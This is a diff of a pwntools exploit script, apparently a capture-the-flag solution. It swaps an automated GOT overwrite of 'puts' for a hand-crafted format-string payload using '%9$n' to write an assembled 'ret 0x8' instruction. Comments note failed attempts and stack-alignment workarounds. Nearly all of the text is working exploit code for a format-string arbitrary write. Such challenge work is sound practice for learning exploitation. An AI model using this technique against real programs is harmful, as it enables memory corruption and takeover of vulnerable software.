@@ -46,18 +46,12 @@ continue
 
 # -- Exploit goes here --
 
-# nevermind that, it'll get filtered anyway
-where = exe.got['puts']
-# what = exe.symbols['win'], didn't work because then you loop at every call of puts
-# what = 0x40148d # address of last scanf + printf before bye, didn't work because of some weird stack align in scanf
-what = asm('ret 0x8') # necessary to align the stack
-what += b'\x01' # necessary to allow the write as an int
-writes = {where:what}
+instruction = asm('ret 0x8') # necessary to align the stack
 
 # we control the stack address where the value to xor has been copied, which is the 9th parameter
-# one 0x0a byte is written before, we take into account the 16 bytes used by the format specifier, so 2 quad words more
-payload = fmtstr_payload(7, writes, numbwritten=1, write_size='int')
-# print(payload)
+# one 0x0a byte is written before, so we have to subtract one from what we write
+what = unpack(instruction, 24) - 1
+payload = f'%{what}c%9$n@'.encode()
 
 io = start()
 
